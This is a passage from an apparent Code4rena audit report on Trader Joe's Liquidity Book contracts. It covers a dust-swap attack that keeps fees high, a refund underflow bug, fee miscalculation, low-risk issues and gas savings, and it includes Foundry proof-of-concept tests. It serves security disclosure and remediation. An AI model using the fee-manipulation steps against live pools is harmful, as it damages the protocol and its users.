(block.timestamp).safe40();\n\n            updateVolatilityAccumulated(_fp, _activeId);\n        }\n\nThe critical issue is that when the time since last swap is below filterPeriod, Vr does not change, yet the last swap timestamp (\\_fp.time) is updated. Therefore, attacker (TJ competitor) can keep fees extremely high at basically 0 cost, by swapping just under every Tf seconds, a zero-ish amount. Since Vr will forever stay the same, the calculated Va will stay high (at least Vr) and will make the protocol completely uncompetitive around the clock.\n\nThe total daily cost to the attacker would be  (TX fee (around `$0.05` on AVAX)  + swap fee (&tilde;0) ) &ast; filterPeriodsInDay (default value is 1728) = `$87`.\n\n### Impact\n\nAttacker can make any TraderJoe pair uncompetitive at negligible cost.\n\n### Proof of Concept\n\nAdd this test in LBPair.Fees.t.sol:\n\n    function testAbuseHighFeesAttack() public {\n            uint256 amountY = 30e18;\n            uint256 id;\n            uint256 reserveX;\n            uint256 reserveY;\n            uint256 amountXInForSwap;\n            uint256 amountYInLiquidity = 100e18;\n            FeeHelper.FeeParameters memory feeParams;\n\n            addLiquidity(amountYInLiquidity, ID_ONE, 2501, 0);\n\n            //swap X -> Y and accrue X fees\n            (amountXInForSwap,) = router.getSwapIn(pair, amountY, true);\n\n            (reserveX,reserveY,id ) = pair.getReservesAndId();\n            feeParams = pair.feeParameters();\n            console.log(\"indexRef - start\" , feeParams.indexRef);\n            console.log(\"volatilityReference - start\" , feeParams.volatilityReference);\n            console.log(\"volatilityAccumulated - start\" , feeParams.volatilityAccumulated);\n            console.log(\"active ID - start\" , id);\n            console.log(\"reserveX - start\" , reserveX);\n            console.log(\"reserveY - start\" , reserveY);\n\n            // ATTACK step 1 - Cross many bins / wait for high volatility period\n            token6D.mint(address(pair), amountXInForSwap);\n            vm.prank(ALICE);\n            pair.swap(true, DEV);\n\n            (reserveX,reserveY,id ) = pair.getReservesAndId();\n            feeParams = pair.feeParameters();\n            console.log(\"indexRef - swap1\" , feeParams.indexRef);\n            console.log(\"volatilityReference - swap1\" , feeParams.volatilityReference);\n            console.log(\"volatilityAccumulated - swap1\" , feeParams.volatilityAccumulated);\n            console.log(\"active ID - swap1\" , id);\n            console.log(\"reserveX - swap1\" , reserveX);\n            console.log(\"reserveY - swap1\" , reserveY);\n\n            // ATTACK step 2 - Decay the Va into Vr\n            vm.warp(block.timestamp + 99);\n            token18D.mint(address(pair), 10);\n            vm.prank(ALICE);\n            pair.swap(false, DEV);\n\n            (reserveX,reserveY,id ) = pair.getReservesAndId();\n            console.log(\"active ID - swap2\" , id);\n            console.log(\"reserveX - swap2\" , reserveX);\n            console.log(\"reserveY - swap2\" , reserveY);\n            feeParams = pair.feeParameters();\n            console.log(\"indexRef - swap2\" , feeParams.indexRef);\n            console.log(\"volatilityReference - swap2\" , feeParams.volatilityReference);\n            console.log(\"volatilityAccumulated - swap2\" , feeParams.volatilityAccumulated);\n\n\n            // ATTACK step 3 - keep high Vr -> high Va\n            for(uint256 i=0;i<10;i++) {\n                vm.warp(block.timestamp + 49);\n\n                token18D.mint(address(pair), 10);\n                vm.prank(ALICE);\n                pair.swap(false, DEV);\n\n                (reserveX,reserveY,id ) = pair.getReservesAndId();\n                console.log(\"**************\");\n                console.log(\"ITERATION \", i);\n                console.log(\"active ID\" , id);\n                console.log(\"reserveX\" , reserveX);\n                console.log(\"reserveY\" , reserveY);\n                feeParams = pair.feeParameters();\n                console.log(\"indexRef\" , feeParams.indexRef);\n                console.log(\"volatilityReference\" , feeParams.volatilityReference);\n                console.log(\"volatilityAccumulated\" , feeParams.volatilityAccumulated);\n                console.log(\"**************\");\n            }\n\n        }\n\n### Tools Used\n\nManual audit, foundry\n\n### Recommended Mitigation Steps\n\nSeveral options:\n\n1. Decay linearly to the time since last swap when T < Tf.\n\n2. Don't update \\_tf.time if swap did not affect Vr\n\n3. If `T<Tf`, only skip Vr update if swap amount is not negligible. This will make the attack not worth it, as protocol will accrue enough fees to offset the lack of user activity.\n\n### Severity level\n\nI argue for HIGH severity because I believe the impact to the protocol is that most users will favor alternative AMMs, which directly translates to a large loss of revenue. AMM is known to be a very competitive market and using high volatility fee `%` in low volatility times will not attract any users.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1292424264):**\n > Not sure about severity at this time, changing to group.\n> \n> Ultimately if invariant broken, High is appropriate, if Loss of Value Med more appropriate. Devil is in the detail.\n\n**[0x0Louis (Trader Joe) acknowledged and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1297297728):**\n > We acknowledge this issue, but we now reset the `indexRef` in the `forceDecay` function.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/430#issuecomment-1313916735):**\n > The warden has shown how trivially a dust trade can be performed to keep fees higher than intended.\n> \n> Given the discussion above, considering that fees are more in line with loss of yield / capital inefficiency, I believe the finding to be of Medium Severity.\n\n\n\n***\n\n## [[M-06] Calling `swapAVAXForExactTokens` function while sending excess amount cannot refund such excess amount](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469)\n*Submitted by [rbserver](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469), also found by [lukris02](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/520), [Trust](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/519), [hyh](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/494), [pashov](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/343), [TomJ](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/329), [ElKu](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/290), [m\\_Rassska](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/253), [neumo](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/245), [d3e4](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/191), [Rahoz](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/115), [8olidity](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/84), [cccz](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/49), and [vv7](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/33)*\n\nWhen calling the `swapAVAXForExactTokens`  function, `if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value)` is executed, which is for refunding any excess amount sent in; this is confirmed by this function's comment as well. However, executing `amountsIn[0] - msg.value` will always revert when `msg.value > amountsIn[0]` is true. Developers who has the design of the `swapAVAXForExactTokens` function in mind could develop front-ends and contracts that will send excess amount when calling the `swapAVAXForExactTokens` function. Hence, the users, who rely on these front-ends and contracts for interacting with the `swapAVAXForExactTokens` function will always find such interactions being failed since calling this function with the excess amount will always revert. As a result, the user experience becomes degraded, and the usability of the protocol becomes limited.\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521>\n\n```solidity\n    /// @notice Swaps AVAX for exact tokens while performing safety checks\n    /// @dev will refund any excess sent\n    ...\n    function swapAVAXForExactTokens(\n        uint256 _amountOut,\n        uint256[] memory _pairBinSteps,\n        IERC20[] memory _tokenPath,\n        address _to,\n        uint256 _deadline\n    )\n        external\n        payable\n        override\n        ensure(_deadline)\n        verifyInputs(_pairBinSteps, _tokenPath)\n        returns (uint256[] memory amountsIn)\n    {\n        ...\n\n        if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value);\n    }\n```\n\n### Proof of Concept\n\nPlease add the following test in `test\\LBRouter.Swaps.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testSwapAVAXForExactTokensIsUnableToRefund() public {\n        uint256 amountOut = 1e18;\n\n        (uint256 amountIn, ) = router.getSwapIn(pairWavax, amountOut, false);\n\n        IERC20[] memory tokenList = new IERC20[](2);\n        tokenList[0] = wavax;\n        tokenList[1] = token6D;\n        uint256[] memory pairVersions = new uint256[](1);\n        pairVersions[0] = DEFAULT_BIN_STEP;\n\n        vm.deal(DEV, amountIn + 500);\n\n        // Although the swapAVAXForExactTokens function supposes to refund any excess sent,\n        //   calling it reverts when sending more than amountIn\n        //   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow\n        vm.expectRevert(stdError.arithmeticError);\n        router.swapAVAXForExactTokens{value: amountIn + 1}(amountOut, pairVersions, tokenList, DEV, block.timestamp);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520> can be updated to the following code.\n\n```solidity\n        if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, msg.value - amountsIn[0]);\n```\n\n**[0x0Louis (Trader Joe) confirmed, but disagreed with severity](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469)**\n\n**[Alex the Entreprenerd (judge) decreased severity to Low and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469#issuecomment-1312807502):**\n > The finding is valid, sending more than necessary will revert.<br>\n> No loss to end-users was shown, and the revert will prevent the tx from finishing.\n> \n> Because of that, considering the fact that a accurate measure could be calculated, meaning that functionality can be side-stepped, despite recommending fixing, I think the finding is QA - Low Severity as the revert is self-inflicted.\n\n**[Alex the Entreprenerd (judge) increased severity to Medium and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469#issuecomment-1321260885):**\n > Per discussion from backstage I've re-reviewed the finding.\n> \n> I have poked around with the test provided and tweaked it a little, this is the last one I have\n> ```solidity\n> function testSwapAVAXForExactTokensIsUnableToRefund() public {\n>         uint256 amountOut = 1e18;\n> \n>         (uint256 amountIn, ) = router.getSwapIn(pairWavax, amountOut, false);\n> \n>         IERC20[] memory tokenList = new IERC20[](2);\n>         tokenList[0] = wavax;\n>         tokenList[1] = token6D;\n>         uint256[] memory pairVersions = new uint256[](1);\n>         pairVersions[0] = DEFAULT_BIN_STEP;\n> \n>         vm.deal(DEV, 50 * amountIn + 500);\n> \n> \n>         // Although the swapAVAXForExactTokens function supposes to refund any excess sent,\n>         //   calling it reverts when sending more than amountIn\n>         //   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow\n>         vm.expectRevert(stdError.arithmeticError);\n>         router.swapAVAXForExactTokens{value: amountIn + 1}(amountOut, pairVersions, tokenList, DEV, block.timestamp);\n> \n>         router.swapAVAXForExactTokens{value: amountIn}(amountOut, pairVersions, tokenList, DEV, block.timestamp);\n> \n>         vm.expectRevert(stdError.arithmeticError);\n>         router.swapAVAXForExactTokens{value: amountIn + 100000}(amountOut, pairVersions, tokenList, DEV, block.timestamp);\n> \n> \n>     }\n> ```\n> \n> Ultimately we can conclude that any amount below `amountIn` will result in a revert due to insufficient amountOut, and any amount above `amountIn` will revert due to the highlighted overflow.\n> \n> The function is a routing function, which is meant to allow some degree of slippage.\n> \n> My original downgrade was based on the idea that the function can run, however, after it being flagged, I must agree that the availability of the function is impaired in the majority of ordinary cases (a `.10%` / `.5%` slippage is expected under most operations / FEs).\n> \n> For this reason, I agree with upgrading back to Medium Severity.\n> \n> I'd like to thank @shung and @hyh for their feedback.\n\n\n\n***\n\n## [[M-07] Incorrect fee calculation on LBPair (fees collected on swaps are less than what they \"should\" be)](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470)\n*Submitted by [sha256yan](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470), also found by [Jeiwan](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/339)*\n\nLBPair contracts consistently collect less fees than their FeeParameters.\n\n### Github and source code\n\n<https://github.com/sha256yan/incorrect-fee>\n\n### Motivation and Severity\n\n*Note: please see warden's [original submission](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470) for full details.*\n\nLBpair contracts' fees fall short by `0.1%` on single bin with the deficit growing exponentially with multi-bin swaps.\n\nThis report will refer to this difference in fees, that is, the difference between the expected fees and the actual collected fees as the \"Fee Deficit\".\n\n![feeDeficitGrowth](https://user-images.githubusercontent.com/91401566/197405701-e6df80c4-dcdf-44f5-9fd2-74ef1c66b954.png)\n\nThe exponential growth of the Fee Deficit percentage is concerning, considering that the vast majority of the fees collected\nby LPs and DEXs are during high volatility periods.<br>\nNote that the peak Fee Deficit percentage of `1.6%` means that `1.6%` of expected fees would not be collected.\n\nWith an assumed average total fee of `1%` (higher than usual due to `variableFee` component) and average Fee Deficit percentage of `0.4%`;<br>\nThe total Fee Deficit from a period similar to May 7th 2022 - May 14th 2022, with approximately `$1.979B` in trading volume, would be `$79,160` over one week.\n\n[SwapHelper.getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65) carries most of the blame for this error.\n\n3 main causes have been identified and will be discussed in this report.\n\n*   Incorrect use of getFeeAmountFrom\n*   Incorrect conditional for amountIn overflow\n*   Need for an additional FeeHelper function\n\n#### Affected contracts and libraries\n\n*   LBPair.sol\n    *   [swap](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L304-L330)\n\n*   LBRouter.sol\n    *   [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125)\n    *   [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)\n\n*   SwapHelper.sol\n    *   [getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65)\n\n#### Proposed changes\n\n*   FeeHelper.sol\n    *   [getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/libraries/FeeHelper.sol#L164-L173) ( ***New*** )\n\n*   SwapHelper.sol\n    *   [getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L118-L126) ( ***New*** )\n\n*   LBRouter.sol\n    *   [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/716cddf2583da86674376cb5346bf46b701b242c/test/mocks/correctFee/LBRouterV2.sol#L124-L125) ( ***Modified*** )\n    *   [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/c1719b8429c7d25e4e12fc4632842285a2eaaf8b/test/mocks/correctFee/LBRouterV2.sol#L168-L169) ( ***Modified*** )\n\n*   LBPair.sol\n    *   [swap](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/test/mocks/correctFee/LBPair.sol#L332-L333)  ( ***Modified*** )\n\n#### Details\n\n*   As mentioned earlier, most issues arise from `SwapHelper.getAmounts`. The SwapHelper library is often used for the Bin type. ([Example in LBPair](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L36)). The proposed solution includes the new functions [SwapHelper.getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/SwapHelper.sol#L76-L133) and [FeeHelper.getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/FeeHelper.sol#L164-L173).\n\n*   LBPair.swap uses `_bin.getAmounts(...)` on the active bin to calculate fees. ([See here](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L329-L330))\n\n*   Inside of `SwapHelper.getAmounts`, for a given swap, if a bin has enough liqudity, the fee is calculated using ([FeeHelper.getFeeAmountFrom](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L65)). This results in smaller than expected fees.\n\n*   `LBRouter.getSwapOut` relies on `SwapHelper.getAmounts` to simulate swaps. Its simulations adjust to the correct fee upon using `SwapHelper.getAmountsV2` ([LBRouter.getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125), [SwapHelper.getAmounts](), [SwapHelper.getAmountsV2]())\n\n*   `LBRouter.getSwapIn` has a fee calculation error which is independent of `SwapHelper.getAmounts`. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169))\n\n*   As of right now the `LBPair.swap` using getAmountsV2 uses `3.8%` ***more*** gas.\n\n![LBPair comparison](https://user-images.githubusercontent.com/91401566/197410772-e3f1cb99-7181-48f7-a56a-2430176a92ff.png)\n\n### Incorrect use of getFeeAmountFrom\n\n*   When there is enough liquidity in a bin for a swap, we should use `FeeHelper.getFeeAmount(amountIn)` instead of `FeeHelper.getFeeAmountFrom(amountIn)`.\n\n#### Evidence\n\n*   amountIn, the parameter passed to calculate fees, is the amount of tokens in the LBPair contract in excess of the reserves and fees of the pair for that token. [Inside LBPair.sol](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/LBPair.sol#L312-L314) - [Inside TokenHelper](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/TokenHelper.sol#L59-L69)\n\nWill now use example numbers:\n\n*   Let amountIn = 1e10 (meaning the user has transferred/minted 1e10 tokens to the LBPair)\n*   Let PRECISION = 1e18\n*   Let totalFee =  0.00125 x precision (fee of 0.0125%)\n*   Let price = 1 (parity)\n*   If the current bin has enough liqudity, feeAmount must be: (amountIn &ast; totalFee ) / (PRECISION) = 12500000\n*   [FeeHelper.getFeeAmountFrom(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L124-L126) uses the formula: feeAmount = (amountIn &ast; totalFee) / (PRECISION + totalFee) = 12484394\n*   [FeeHelper.getFeeAmount(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L116-L118) uses exactly the formula ourlined in the correct feeAmount calculation and is the correct method in this case.\n*   Visit the tests section to run a test.\n\n### Incorrect condition for amountIn overflow\n\n*   The [condition](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L61) for when an amountIn overflows the maximum amount available in a bin is flawed.\n*   The Fee Deficit here could potentially trigger an unnecessary bin de-activation.\n\n#### Evidence\n\n**Snippet 1 (SwapHelper.getAmounts)**\n\n            fees = fp.getFeeAmountDistribution(fp.getFeeAmount(_maxAmountInToBin));\n\n            if (_maxAmountInToBin + fees.total <= amountIn) {\n                //do things\n            }\n\n*   Collecting the fees on `_maxAmountInToBin` before doing so on `amountIn` means we are not checking  to see whether `amountIn` after\n\nConsider the following:\n\n**Snippet 2 (SwapHelper.getAmountsV2)**\n\n            fees = fp.getFeeAmountDistribution(fp.getFeeAmount(amountIn));\n\n            if (_maxAmountInToBin <  amountIn - fees.total) {\n                //do things\n            }\n\n*   Now, the fees are collected on `amountIn`.\n*   Assuming both conditions are true, the fees from Snippet2 will be necessarily larger than those in Snippet1 since in both cases `_maxAmountInToBin <  amountIn`.\n*   Snippet 1 produces false positives. Meaning, SwapHelper.getAmounts changes its active bin id more than needed. (See Tests section at the bottom for the relevant test)\n\n### Need for an additional FeeHelper function\n\n*   There are currently functions to answer the following question: How many tokens must a user send, to end up with a given amountInToBin after fees, before the swap itself takes place?\n\n#### Evidence\n\n*   `LBRouter.getSwapIn(, amountOut, )` needs this question answered. At a given price, how many tokens must a user send, to receive `amountOut`?\n    *   We use the `amountOut` and price to work backwards to the `amountInToBin`.\n    *   Current approach calculates fees on `amountInToBin`. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125))\n    *   This is incorrect as fees should be calculated on `amountIn`. (As we discussed in [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom))\n\n*   SwapHelper.getAmounts needs to know what hypothetical `amountIn` would end up as `maxAmountInToBin` after fees. This is needed to be able to avoid [Incorrect amountIn overflow](#incorrect-conditional-for-amountin-overflow)\n\n#### Install dependencies\n\nTo install dependencies, run the following to install dependencies:\n\n    forge install\n\n#### Tests\n\nTo run tests, run the following command:\n\n    forge test --match-contract Report -vv\n\n#### testSingleBinSwapFeeDifference:\n\n*   Simple test to show the Fee Defecit in it's most basic form.\n\n#### testFalsePositiveBinDeactivation\n\n*   Test that shows false positive resulting from the [Incorrect condition](#incorrect-conditional-for-amountin-overflow)\n\n#### testCorrectFeeBinDeactivation\n\n*   Test that shows with getAmountsV2 the false positive issue is resolved.\n\n#### testMultiBinGrowth\n\n*   Generates datapoints used in opening graph.\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470)**\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470#issuecomment-1313772620):**\n > The warden has shown an incorrect application of the fee formula, which results in an exponentially growing reduction in fees taken.\n> \n> While the report is thorough, the maximum impact is a loss of up to `2%` of the total fees (`98%` of fees are collected).\n> \n> Because of the reduced order of magnitude for the impact, I think the appropriate severity to be Medium as the finding will cause a loss of yield as shown by the Warden.\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 11 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334) by **zzykxx** received the top score from the judge.\n\n*The following wardens also submitted reports: [brgltd](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/477), [rbserver](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/475), [hansfriese](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/446), [pashov](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/342), [IllIllI](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/325), [adriro](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/280), [0xSmartContract](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/186), [KingNFT](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/177), [0x1f8b](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/153), and [Rolezn](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/142).*\n\n## Summary\n\n[L-01]  Missing sanity checks on `to` addresses in `LBRouter.sol`<br>\n[L-02]  Potential loss of funds on tokens with big supplies<br>\n[L-03]  In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens<br>\n[L-04] [Excess amount returned to flashloan is not sent back](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/309)<br>\n[L-05] [It's possible to pay a lower fee than expected for a flashloan](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/310)<br>\n[L-06] [Rebasing tokens are not compatible with the protocol](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/311)<br>\n\n## [L-01] Missing sanity checks on `to` addresses in `LBRouter.sol`\n\nAll the public/external functions in `LBRouter.sol` require an address `to` as a parameter to which to send either tokens, LBtokens or ETH.\nWhen tokens or LBtokens are sent the protocol should check that if the `to` address is contract then that contract should is able to manage `ERC20/LBTokens`, otherwise funds would be lost.\n\n## [L-02] Potential loss of funds on tokens with big supplies\n\n`swap()` and `mint()` both reverts if either `2^112` or `2^128` tokens are sent to the pair. This would result in the funds being stuck and nobody being able to mint or swap. Submitting as low because the cost of attack is extremely high, but it's good to be aware of it.\n\n## [L-03] In `TokenHelper.sol` the `safeTransfer` function does not check for potentially self-destroyed tokens.\n\nIf a pair gets created and after a while one of the tokens gets self-destroyed (maybe because of a bug) then `safeTransfer` would still succeed. It's probably a good idea to check if the contract still exists by checking the bytecode length.\n\n**[0x0Louis (Trader Joe) confirmed](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334#issuecomment-1322827665):**\n > Really high impact, short and sweet when adding together all findings, good job!\n> \n > L-01 Missing sanity checks on to addresses in LBRouter.sol\n>\n > L-02 Potential loss of funds on tokens with big supplies\n>\n > L-03 In TokenHelper.sol the safeTransfer function does not check for potentially self-destroyed tokens.\n>\n > Also included for judging:<br>\n > [L-04 Excess amount returned to flashloan is not sent back](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/309)<br>\n > [L-05 It's possible to pay a lower fee than expected for a flashloan](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/310)<br>\n > [L-06 Rebasing tokens are not compatible with the protocol](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/311)<br>\n\n\n***\n\n# Gas Optimizations\n\nFor this contest, 14 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250) by **shung** received the top score from the judge.\n\n*The following wardens also submitted reports: [c3phas](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/480), [0x4non](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/437), [MiloTruck](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/406), [pfapostol](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/379), [IllIllI](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/326), [TomJ](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/303), [\\_\\_141345\\_\\_](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/282), [m\\_Rassska](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/190), [ReyAdmirado](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/162), [Shishigami](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/130), [Saintcode\\_](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/98), [Mathieu](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/24), and [LeoS](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/14).*\n\n## [G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol\n\n`LBToken` [enumerates token/bin IDs owned by users in a pair](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L26-L27). The enumeration is only exposed through [two external functions](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L96-L109), which are just for convenience for off-chain usage, and not necessary for the functionality of the protocol. Removing enumeration will save tremendous amounts of gas during essential operations of adding and removing liquidity.\n\n### Impact of enumeration\n\nOpenZeppelin’s EnumerableSet roughly costs 50,000 gas when adding and removing elements from the set. Even for a small price range, adding liquidity in Liquidity Book requires minting tokens from many bins. For example, currently [the testnet user interface](https://gadgetzan.traderjoexyz.com/poolv2/0xb6076c93701d6a07266c31066b298aec6dd65c2d/0xab231a5744c8e6c45481754928ccffffd4aa0732/1) mints 31 tokens when adding liquidity in a normal distribution shape. This operation [roughly costs 4,000,000 gas](https://testnet.snowtrace.io/tx/0x88812398557021281e52eacf38f5064a344d4bee0290e96b37ffc2bea6102042), and removal costs about half of that. Given a volatile market, we can expect users to remove and re-add liquidity pretty often. This coupled operation costs around 6,000,000 gas if you have the minimum amount of bins in a normal distribution (31 as allowed by the current UI), which will be about 0.15 AVAX (25 nAVAX base fee). That would be `$2.25` in current AVAX price (`$15`). And that would be `$15` when AVAX is `$100`, and `$120` when AVAX is `$100` and network is heavily used (200 nAVAX base fee). Given that the protocol needs `swap_fee_earned / gas_fee_to_move_liquidity` to be greater than `1` to incentivize users to chase the price to concentrate the liquidity, the mint & burn fees must be as little as possible to allow non-whales to be also able to profitably move around their liquidity. Removing the enumeration can nearly halve that cost, making the protocol enticing to more users.\n\n### [Non-]reasons to enumerate\n\nEnumeration allows user interfaces to easily see which bins a user is in directly from the blockchain. With the absence of enumeration, Trader Joe will need to index this information either using in-house tools or using something like The Graph. Trader Joe team is already familiar with indexing through their NFT marketplace Joepegs, therefore it seems practical for them to go off-chain indexing route.\n\nEnumeration allows a decentralized way to pull the information from the blockchain. We have to admit that not enumerating would be in detriment to user interfaces that would have wanted to integrate Liquidity Book by using decentralized methods only. However, that is a very small percent of builders that hold such principles. The rest of the builders can also use off-chain indexing.\n\nThere is also the end user who might want to learn which bins they are in conveniently using decentralized methods. They can still do this in decentralized manner by checking all the bins, given the bin IDs are determined by step and price and have a range of few thousand (bin step = 100) to few millions (bin step = 1). Admittedly this is not very convenient, but it is doable.\n\n### Diff to remove enumeration\n\n*For diff that removes the enumeration from the code and tests, see warden's [original submission](https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250).*\n\n### Gas savings\n\nBelow is the output of `forge snapshot --diff | tail -65` converted to CSV. Especially see `testInternalBurn` and `testInternalMint` functions showing greater than `50%` savings.\n\n```csv\nTest Function,Gas Cost Difference,Percent 